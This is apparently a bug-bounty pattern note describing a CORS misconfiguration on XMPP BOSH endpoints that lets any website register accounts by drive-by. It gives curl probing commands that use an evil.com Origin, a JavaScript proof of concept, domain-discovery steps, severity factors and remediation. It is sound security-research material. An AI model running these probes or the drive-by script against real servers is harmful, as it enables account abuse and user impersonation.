---
type: pattern
title: Pattern - CORS XMPP BOSH Drive-by Registration
tags: [pattern, cwe-284, cwe-346, xmpp, bosh, cors, ejabberd, prosody, drive-by, iq-register, bb-pattern]
status: verified
first_seen: 2026-05-18
last_updated: 2026-05-18
severity: P2 High
precedents: vendor-chat (ejabberd CORS:* + iq-register open)
---

# Pattern - CORS XMPP BOSH Drive-by Registration

## TL;DR

XMPP server exposes BOSH endpoint (`/http-bind`) with `Access-Control-Allow-Origin: *` AND XEP-0077 In-Band Registration enabled. Any malicious website can silently establish a BOSH session and register XMPP accounts via browser `fetch()` — no user interaction beyond visiting the page.

## Root-cause ingredients

Three conditions must ALL be true:

1. **BOSH endpoint publicly reachable** — `/http-bind` on a public domain (not behind VPN/firewall)
2. **CORS: `Access-Control-Allow-Origin: *`** — allows cross-origin `fetch()` from any website
3. **iq-register open** — `<register xmlns='http://jabber.org/features/iq-register'/>` in stream features, returning `<username/>` + `<password/>` form without authentication

## Detection (grep / curl)

```bash
# Step 1: Check CORS
curl -s -D- -X OPTIONS "https://TARGET/http-bind" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" | grep "Access-Control-Allow-Origin"
# Vulnerable if: Access-Control-Allow-Origin: *

# Step 2: BOSH session init — find XMPP domain
curl -s -X POST "https://TARGET/http-bind" \
  -H "Content-Type: text/xml" \
  -d "<body rid='1000001' xmlns='http://jabber.org/protocol/httpbind' to='XMPP_DOMAIN' xml:lang='en' wait='60' hold='1' ver='1.6' xmpp:version='1.0' xmlns:xmpp='urn:xmpp:xbosh'/>"
# Look for: <register xmlns='http://jabber.org/features/iq-register'/>

# Step 3: iq-register query (GET only, don't actually register)
curl -s -X POST "https://TARGET/http-bind" \
  -H "Content-Type: text/xml" \
  -d "<body rid='1000002' sid='SID' xmlns='http://jabber.org/protocol/httpbind'><iq type='get' id='reg1' xmlns='jabber:client'><query xmlns='jabber:iq:register'/></iq></body>"
# Vulnerable if: <instructions>Choose a username and password...</instructions>
```

## Drive-by PoC (browser JS)

```javascript
// Any malicious website can run this — browser CORS preflight passes
async function xmppDriveBy() {
  const r1 = await fetch('https://TARGET/http-bind', {
    method: 'POST',
    headers: {'Content-Type': 'text/xml'},
    body: "<body rid='1000001' xmlns='http://jabber.org/protocol/httpbind' to='XMPP_DOMAIN'...>"
  });
  const sid = (await r1.text()).match(/sid='([^']+)'/)[1];
  
  // iq-register GET — retrieve registration form
  const r2 = await fetch('https://TARGET/http-bind', {
    method: 'POST',
    headers: {'Content-Type': 'text/xml'},
    body: `<body rid='1000002' sid='${sid}' xmlns='http://jabber.org/protocol/httpbind'><iq type='get' id='reg1' xmlns='jabber:client'><query xmlns='jabber:iq:register'/></iq></body>`
  });
  // Returns username + password registration form
}
```

## XMPP domain discovery

BOSH endpoint may reject with `<host-unknown/>` if the wrong XMPP domain is used. Systematic discovery:
1. Try the BOSH hostname itself (`meet.example.com`)
2. Try parent domain (`example.com`)
3. Try `im.example.com`, `xmpp.example.com`
4. Check DNS SRV: `dig _xmpp-client._tcp.example.com SRV`

## Severity factors

| Factor | Higher | Lower |
|--------|--------|-------|
| iq-register SET works | P1 (actual account creation) | P2 (form exposed, may fail on SET) |
| CORS | `*` (any website) | specific origin (targeted only) |
| Server type | Production IM (user impersonation) | Meet/Jitsi (conference only) |
| Combined with enumeration | Can register as real usernames | Random names only |

## Real-world example

- **Target:** imapi.vendor-chat.example.net (ejabberd, production IM)
- **XMPP domain:** im.vendor-chat.example.net
- **CORS:** `Access-Control-Allow-Origin: *`
- **iq-register:** Open, returns username + password form
- **Combined with member enumeration:** Confirms real usernames -> impersonation
- **Impact:** Enterprise IM users could receive messages from attacker-registered lookalike accounts

## Remediation

1. Disable `mod_register` or set `access_register: deny` in ejabberd/Prosody config
2. Change CORS from `*` to specific allowed origins
3. If registration needed: add CAPTCHA (`mod_register_web`) or email/SMS verification
4. Restrict BOSH to authenticated apps (API key or client certificate)
